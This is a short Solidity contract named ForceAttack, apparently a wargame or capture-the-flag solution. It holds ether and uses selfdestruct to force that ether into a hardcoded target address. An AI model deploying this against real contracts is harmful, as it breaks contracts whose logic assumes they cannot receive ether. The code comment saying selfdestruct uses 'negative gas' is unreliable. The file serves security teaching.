// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

contract ForceAttack {
    address public forceAddress = 0xC32cAE052F885fD428dccCC5C6ABEa0A2dd8628e;

    //constuct with some ethers to the contract
    constructor() payable {}

    //destruct and send left-over to the target address, selfdestruct opcode use a negative gas
    function destruct() external {
        selfdestruct(payable(forceAddress));
    }
}
